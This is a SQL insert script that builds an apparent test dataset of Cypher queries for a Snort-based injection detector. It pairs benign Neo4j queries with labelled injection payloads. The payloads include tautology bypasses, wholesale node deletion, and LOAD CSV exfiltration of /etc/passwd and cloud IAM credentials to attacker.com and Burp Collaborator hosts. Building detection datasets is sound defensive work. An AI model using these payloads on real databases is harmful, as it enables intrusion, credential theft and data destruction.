INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('subquery with CALL','CALL {  MATCH (p:Person)-[:FRIEND_OF]->(other:Person)  RETURN p, other  UNION  MATCH (p:Child)-[:CHILD_OF]->(other:Parent)  RETURN p, other} RETURN p',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('exists subquery','MATCH (p:Person)  WHERE EXISTS {    MATCH (p)-[:HAS_DOG]->(dog:Dog)    WHERE p.name = dog.name  }  RETURN p.name AS name',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('collect subquery','MATCH (person:Person) WHERE ''Ozzy'' IN COLLECT { MATCH (person)-[:HAS_DOG]->(dog:Dog) RETURN dog.name } RETURN person.name AS name',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('type predicate expressions','MATCH (n) WHERE n.property IS :: INTEGER NOT NULL RETURN n',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('avg function','UNWIND [duration(''P2DT3H''), duration(''PT1H45S'')] AS dur RETURN avg(dur)',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('duration database function','RETURN duration(''P1Y2M10DT12H45M30.25S'') AS duration',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('list functions','MATCH (a) WHERE a.name = ''Alice'' RETURN keys(a)',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('list functions with reduce','MATCH p = (a)-->(b)-->(c) WHERE a.name = ''Alice'' AND b.name = ''Bob'' AND c.name = ''Daniel'' RETURN reduce(totalAge = 0, n IN nodes(p) | totalAge + n.age) AS reduction',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('list functions toStringList','RETURN toStringList(null) as noList, toStringList([null, null]) as nullsInList, toStringList([''already a string'', 2, date({year:1955, month:11, day:5}), null, [''A'',''B'']]) as mixedList',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('mathematical functions','MATCH (a), (e) WHERE a.name = ''Alice'' AND e.name = ''Eskil'' RETURN a.age, e.age, abs(a.age - e.age)',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('logarithmic functions','RETURN log10(27)',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('trigonometric functions','RETURN atan2(0.5, 0.6)',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('predicate functions','MATCH (p:Person) WHERE any(nationality IN p.nationality WHERE nationality = ''American'') RETURN p',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('scalar functions coalesce','MATCH (a) WHERE a.name = ''Alice'' RETURN coalesce(a.hairColor, a.eyes)',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('scalar functions head','MATCH (a) WHERE a.name = ''Eskil'' RETURN a.liked_colors, head(a.liked_colors)',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('scalar functions valueType','UNWIND ["abc", 1, 2.0, true, [date()]] AS value RETURN valueType(value) AS result',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('string functions','RETURN reverse(''palindrome'')',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('string functions toStringOrNull','RETURN  toString(11.5),  toString(''already a string''),  toString(true),  toString(date({year: 1984, month: 10, day: 11})) AS dateString,  toString(datetime({year: 1984, month: 10, day: 11, hour: 12, minute: 31, second: 14, millisecond: 341, timezone: ''Europe/Stockholm''})) AS datetimeString,  toString(duration({minutes: 12, seconds: -60})) AS durationString',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('spatial functions','MATCH (t:TrainStation)-[:TRAVEL_ROUTE]->(o:Office) WITH  point({longitude: t.longitude, latitude: t.latitude}) AS trainPoint, point({longitude: o.longitude, latitude: o.latitude}) AS officePoint RETURN round(point.distance(trainPoint, officePoint)) AS travelDistance',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('temporal functions','RETURN localdatetime.realtime() AS now',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('point indexes','CREATE POINT INDEX index_name FOR (p:Person) ON (p.location) OPTIONS {  indexConfig: {    `spatial.cartesian.min`: [-100.0, -100.0],    `spatial.cartesian.max`: [100.0, 100.0]  }}',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('lookup index','CREATE LOOKUP INDEX index_name FOR ()-[r]-() ON EACH type(r)',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('list indexes','SHOW INDEXES YIELD name, type, options, createStatement RETURN name, type, options.indexConfig AS config, createStatement',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('use index','MATCH (n:Person) USING INDEX n:Person(name) WHERE n.name = $value',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('full-text index','CREATE FULLTEXT INDEX relationship_fulltext_index FOR ()-[r:KNOWS]-() ON EACH [r.info, r.note] OPTIONS { indexConfig: {    `fulltext.analyzer`: ''english''  }}',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('vector index','CREATE VECTOR INDEX `abstract-embeddings` FOR (a:Abstract) ON (a.embedding) OPTIONS {  indexConfig: {    `vector.dimensions`: 1536,    `vector.similarity_function`: ''cosine'' }}',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('create constraint','CREATE CONSTRAINT constraint_name FOR (p:Person) REQUIRE p.surname IS UNIQUE OPTIONS {  indexProvider: ''range-1.0''}',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('show aliases','SHOW ALIASES `database-alias` FOR DATABASE',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('create alias','CREATE ALIAS `composite-database-name`.`alias-in-composite-name` FOR DATABASE `database-name` AT $url USER user_name PASSWORD $password',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('server management','SHOW SERVERS',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('role management','SHOW POPULATED ROLES WITH USERS YIELD member, role WHERE member = $user RETURN role',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('privilege management','SHOW ROLE role_name PRIVILEGES AS COMMANDS',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('privilege management','GRANT LOAD ON ALL DATA TO role_name',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('on graph read privileges','GRANT TRAVERSE ON GRAPH * RELATIONSHIP * TO role_name',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('on database privileges','GRANT START ON DATABASE * TO role_name',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('on database index management privileges','GRANT CREATE INDEX ON DATABASE `database-name` TO role_name',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('on database constraint management privileges','GRANT CONSTRAINT MANAGEMENT ON DATABASE * TO role_name',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('on database name management privileges','GRANT NAME MANAGEMENT ON DATABASE * TO role_name',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('on database transaction management privileges','GRANT SHOW TRANSACTION (user_name1, user_name2) ON HOME DATABASE TO role_name1, role_name2',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('on dbms privileges','GRANT EXECUTE BOOSTED PROCEDURE * ON DBMS TO role_name',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('on dbms role management privileges','GRANT SHOW ROLE ON DBMS TO role_name',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('on dbms user management privileges','GRANT SET USER HOME DATABASE ON DBMS TO role_name',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('on dbms database management privileges','GRANT COMPOSITE DATABASE MANAGEMENT ON DBMS TO role_name',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('on dbms alias management privileges','GRANT SHOW ALIAS ON DBMS TO role_name',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('on dbms role management privileges','GRANT RENAME ROLE ON DBMS TO role_name',0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd, ExpectedSnortRuleId) VALUES ('on dbms privilege management privileges','GRANT ASSIGN PRIVILEGE ON DBMS TO role_name',0,0);

INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('Overwriting values in CREATE clauses','CREATE (n:Account) SET n.id=1, n.username="admin",n.admin=False,n.password="",n.admin=True RETURN n//" RETURN n',1, 100001, 'https://hackmd.io/@Chivato/rkAN7Q9NY',0,0,1,0,0,0,0,0,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('Block comments to replace whitespaces','MATCH/*match (John:AccountHolder {FirstName:"John"}) RETURN John*/(n) RETURN n',1, 100001, 'https://hackmd.io/@Chivato/rkAN7Q9NY',0,0,1,0,0,0,0,0,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('Inline comments for nulling trailing hardcoded clauses','MATCH (BA) WHERE BA.Balance = 12345.45 OR 1=1 RETURN BA// RETURN BA LIMIT 1',1, 100001, 'https://hackmd.io/@Chivato/rkAN7Q9NY',0,1,0,0,0,0,0,0,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('Commenting out multiple lines when a block comment appears after the injection point','MATCH (A:AccountHolder) WHERE A.FirstName =~ '''' OR 1=1 RETURN A/*'' RETURN A LIMIT 1 /*Only return 1 result*/',1, 100001, 'https://hackmd.io/@Chivato/rkAN7Q9NY',0,1,0,0,0,0,0,0,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('server-side request forgery','MATCH (BA) WHERE BA.Balance = 12345.45 OR 1=1 LOAD CSV FROM ''http://WWW.burpcollaborator.net/proof_of_ssrf'' AS y RETURN ''''//',1, 100001, 'https://hackmd.io/@Chivato/rkAN7Q9NY',0,1,0,0,0,0,0,1,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('file read','MATCH (n) WHERE n.id="1" OR 1=1 LOAD CSV FROM ''file://etc/passwd'' AS x LOAD CSV FROM ''http://XXX.burpcollaborator.net/''+x[0] AS y RETURN ''''// RETURN n',1, 100001, 'https://hackmd.io/@Chivato/rkAN7Q9NY',0,1,1,0,0,0,0,1,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('data exfiltration','MATCH (n) WHERE n.id=1 OR 1=1 WITH 1337 AS x CALL db.labels() YIELD label AS d LOAD CSV FROM ''''http://XXX.burpcollaborator.net/''''+d AS y RETURN y// RETURN n''''// RETURN n',1, 100001, 'https://hackmd.io/@Chivato/rkAN7Q9NY',0,1,1,0,0,0,0,1,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('delete from a create statement','CREATE (n:AccountHolder) SET n.FirstName="Mike" WITH 1337 AS y MATCH (n:AccountHolder {FirstName:"Mike"}) DETACH DELETE n//" RETURN n',1, 100001, 'https://hackmd.io/@Chivato/rkAN7Q9NY',1,0,1,0,0,0,0,0,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('delete from a match statement','MATCH (BA) WHERE BA.Balance = 12345.45 WITH 12345.45 AS dummy MATCH (n:AccountHolder {FirstName:"Mike"}) DETACH DELETE n// RETURN BA LIMIT 1',1, 100001, 'https://hackmd.io/@Chivato/rkAN7Q9NY',1,0,1,0,0,0,0,0,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('simple in-band injection','MATCH (c:Character) WHERE c.name = ''Spongebob'' or 1=1 RETURN c//'' RETURN c',1, 100001, 'https://pentester.land/blog/cypher-injection-cheatsheet/',0,1,0,0,0,0,0,0,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('in-band injection with UNION','MATCH (a:Person) WHERE id(a) = 42 RETURN 1 AS a UNION CALL db.labels() YIELD label AS a RETURN a',1, 100001, 'https://pentester.land/blog/cypher-injection-cheatsheet/',0,0,0,0,1,0,0,0,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('in-band injection with UNION','MATCH (a:Person) WHERE id(a) = 42 RETURN 1 AS a UNION MATCH(b) RETURN DISTINCT labels(b) AS a',1, 100001, 'https://pentester.land/blog/cypher-injection-cheatsheet/',0,0,0,0,1,0,0,0,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('out-of-band injection','MATCH (p:Person) WHERE id(p) = 42 CALL db.labels() YIELD label LOAD CSV FROM ''https://attacker.com/'' + label AS r RETURN p',1, 100001, 'https://pentester.land/blog/cypher-injection-cheatsheet/',0,0,0,0,0,0,0,1,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('WITH x as Y trick','MATCH (n) WHERE n.id=1337 WITH 1337 AS dummy MATCH (n) DETACH DELETE n// RETURN n',1, 100001, 'https://pentester.land/blog/cypher-injection-cheatsheet/',0,0,1,0,0,0,0,0,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('inline comments','MATCH (n) WHERE n.is_active = 1 OR 1=1 RETURN n// RETURN n LIMIT 0',1, 100001, 'https://pentester.land/blog/cypher-injection-cheatsheet/',0,1,1,0,0,0,0,0,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('multi-line comments','MATCH (u:User) WHERE u.name = '''' OR 1=1 RETURN u/*'' RETURN u LIMIT 5 /*Only return 5 results*/',1, 100001, 'https://pentester.land/blog/cypher-injection-cheatsheet/',0,1,1,0,0,0,0,0,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('multi-line comments with limit','MATCH (u:User) WHERE u.name = '''' OR 1=1 RETURN u /*'' RETURN u /* second comment */ LIMIT 0 /* Do not display output */',1, 100001, 'https://pentester.land/blog/cypher-injection-cheatsheet/',0,1,1,0,0,0,0,0,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('Time-based APOC injection','MATCH (n:User) WHERE n.name=''Jane'' RETURN 1 UNION CALL apoc.util.sleep(10000) RETURN 1 //',1, 100001, 'https://pentester.land/blog/cypher-injection-cheatsheet/',0,0,0,0,1,0,0,0,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('authentication bypass','MATCH (n) WHERE n.name = "admin" and n.password = 1 OR 1=1 RETURN n LIMIT 0',1, 100001, 'https://pentester.land/blog/cypher-injection-cheatsheet/',0,1,0,0,0,0,0,0,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('leak data when you do not know labels and properties','MATCH (c:Character) WHERE c.name = '''' or 1=1 RETURN c//'' RETURN c',1, 100001, 'https://pentester.land/blog/cypher-injection-cheatsheet/',0,1,1,0,0,0,0,0,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('date() trick for error-based injections','MATCH (a:Movie) RETURN a ORDER BY a.title,Date(keys(a))',1, 100001, 'https://pentester.land/blog/cypher-injection-cheatsheet/',0,0,0,1,0,0,0,0,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('substring/char','MATCH (a) WHERE a.title = ''injected'' RETURN 1 AS test UNION MATCH (b:Person) RETURN CASE substring(keys(b)[0],0,1)     WHEN "a" THEN 2    ELSE 3 END AS test//''',1, 100001, 'https://www.justanotherhacker.com/neoj4-injection.html',0,0,1,0,1,0,1,0,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('if condition','MATCH (a) WHERE a.title = ''injected'' RETURN 1 AS test UNION MATCH (b:Person) RETURN case substring(keys(b)[0],0,1) WHEN "n" THEN 2 ELSE 3 END AS test//''',1, 100001, 'https://www.justanotherhacker.com/neoj4-injection.html',0,0,1,0,1,0,1,0,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('length of first property','MATCH (a) WHERE a.title = ''injected'' RETURN 1 AS test UNION MATCH (b:Person) RETURN CASE size(keys(b)[0])     WHEN 1 THEN 2     ELSE 3 END AS test//''',1, 100001, 'https://www.justanotherhacker.com/neoj4-injection.html',0,0,1,0,1,0,1,0,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('substring/char','MATCH (a) WHERE a.title = ''injected'' RETURN 1 AS test UNION MATCH (b:Person) RETURN substring(keys(b)[0],0,1) AS test//''',1, 100001, 'https://www.justanotherhacker.com/neoj4-injection.html',0,0,1,0,1,0,1,0,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('leak internal resource response','LOAD CSV FROM "http://169.254.169.254/latest/meta-data/iam/security-credentials/" AS x LOAD CSV FROM "https://attacker.com/"+x[0] AS y RETURN ''''//',1, 100001, 'https://pentester.land/blog/cypher-injection-cheatsheet/',0,0,0,0,0,0,0,1,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('leak internal resource response','LOAD CSV FROM ''https://challs2.free.beeceptor.com/''+split(''a b c'', '' '')[0] AS y RETURN y',1, 100001, 'https://pentester.land/blog/cypher-injection-cheatsheet/',0,0,0,0,0,0,0,1,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('leak internal resource response','LOAD CSV FROM ''https://internal.service/'' AS x WITH collect(x[0])[1] AS y LOAD CSV FROM ''http://attacker.com/''+y AS z RETURN ''''',1, 100001, 'https://pentester.land/blog/cypher-injection-cheatsheet/',0,0,0,0,0,0,0,1,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('leak internal resource response','LOAD CSV FROM ''https://internal.service/'' AS x WITH collect(x[0])[ITERATE WITH INCREMENTAL INTEGER] AS y LOAD CSV FROM ''http://XXX.burpcollaborator.net/''+y AS z RETURN ''''',1, 100001, 'https://pentester.land/blog/cypher-injection-cheatsheet/',0,0,0,0,0,0,0,1,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('lead the location of a databases import directory','MATCH (n) WHERE n.id="1" OR 1=1 LOAD CSV FROM ''file://etc/passwd'' AS x LOAD CSV FROM ''http://attacker.com/''+x[0] AS y RETURN ''''// RETURN n',1, 100001, 'https://pentester.land/blog/cypher-injection-cheatsheet/',0,1,1,0,0,0,0,1,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('overwrite values in CREAT clauses','CREATE (n:Account) SET n.id=1, n.username="admin",n.admin=False,n.password="",n.admin=True RETURN n //" RETURN n',1, 100001, 'https://pentester.land/blog/cypher-injection-cheatsheet/',1,0,1,0,0,0,0,0,0,0);
INSERT INTO CypherInjection.CypherQuery(QueryTypeCd, QueryTxt, InjectionQueryInd,ExpectedSnortRuleId, SourceTxt, DestructiveInd, TautologyInd, piggybackedInd, illegalIncorrectInd, unionInd, alternateEncodingInd, booleanInd, OOBInd, detectionEvasionInd, storedProcedureInd) VALUES ('delete a node','MATCH (c:Character) WHERE c.name = '''' DELETE c//'' RETURN c',1, 100001, 'https://pentester.land/blog/cypher-injection-cheatsheet/',1,0,1,0,0,0,0,0,0,0);
